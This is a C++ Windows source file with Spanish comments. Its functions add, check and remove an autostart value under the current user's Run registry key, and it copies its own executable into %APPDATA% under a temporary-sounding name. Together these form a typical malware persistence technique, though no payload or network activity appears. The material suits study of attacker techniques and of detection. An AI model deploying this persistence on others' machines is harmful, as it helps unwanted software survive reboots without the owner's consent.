#include <windows.h>
#include <iostream>
#include <string>

bool persistence(const std::wstring& valueName, const std::wstring& path) {
    // Function to apply persistence
    HKEY hKey;
    const wchar_t* subKey = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";

    // Create or Open HKCU/Run Key
    if (RegOpenKeyExW (HKEY_CURRENT_USER, subKey, 0, KEY_WRITE, &hKey) != ERROR_SUCCESS) {
            return false;
    }

    LONG rc = RegSetValueExW(hKey, valueName.c_str(), 0, REG_SZ,
        reinterpret_cast<const BYTE*>(path.c_str()),
        static_cast<DWORD>((path.size() + 1) * sizeof(wchar_t))
    );

    RegCloseKey(hKey);
    return (rc == ERROR_SUCCESS);
}


bool deletePersistence(const std::wstring& valueName) {
    // Function to delete persistence
    const wchar_t* subKey = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    HKEY hKey = NULL;

    // open HKCU Key with write permissions
    REGSAM sam = KEY_READ | KEY_WRITE;
    LONG rc = RegOpenKeyExW(HKEY_CURRENT_USER, subKey, 0, sam, &hKey);

    if (rc != ERROR_SUCCESS) {
        // do not print output
        return false;
    }

    // Delete value
    rc = RegDeleteValueW(hKey, valueName.c_str());

    if (rc == ERROR_SUCCESS) {
        std::wcout << L"Value deleted: " << valueName.c_str() << L"\n";
    } else if (rc == ERROR_FILE_NOT_FOUND) {
        std::wcout << L"Value does not exist: " << valueName.c_str() << L"\n";
    } else {
        std::wcout << L"RegDeleteValueW falló: " << rc << L"\n";
        RegCloseKey(hKey);
        return false;
    }

    RegCloseKey(hKey);
    return true;
}


bool checkPersistence(const std::wstring& valueName) {
    HKEY hKey;
    const wchar_t* subKey = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";

    if (RegOpenKeyExW(HKEY_CURRENT_USER, subKey, 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        return false;
    }

    LONG rc = RegQueryValueExW(hKey, valueName.c_str(), nullptr, nullptr, nullptr, nullptr);
    RegCloseKey(hKey);

    return (rc == ERROR_SUCCESS);
}

//Copiar ejecutable en %APPDATA%
int copyexe() {
    // 1) Obtener ruta del ejecutable actual
    char exePath[MAX_PATH];                        // buffer para la ruta
    DWORD len = GetModuleFileNameA(NULL, exePath, MAX_PATH);
    if (len == 0) {
        std::cerr << "Error: no se pudo obtener la ruta del exe.\n";
        return 1;
    }

    // 2) Obtener carpeta AppData desde la variable de entorno %APPDATA%
    const char* appdata = std::getenv("APPDATA");
    if (!appdata) {                               // si no existe la variable
        std::cerr << "Error: APPDATA no encontrada.\n";
        return 1;
    }

    // 3) Construir ruta destino (AppData\\NombreTemporal.exe)
    std::string destino = std::string(appdata) + "\\NombreTemporal.exe";

    // 4) Copiar el archivo (origen = exePath, destino = destino.c_str())
    if (CopyFileA(exePath, destino.c_str(), FALSE)) {
        std::cout << "Copiado correctamente a: " << destino << "\n";
    }
    else {
        std::cerr << "Error al copiar (codigo): " << GetLastError() << "\n";
        return 1;
    }

    return 0;
}

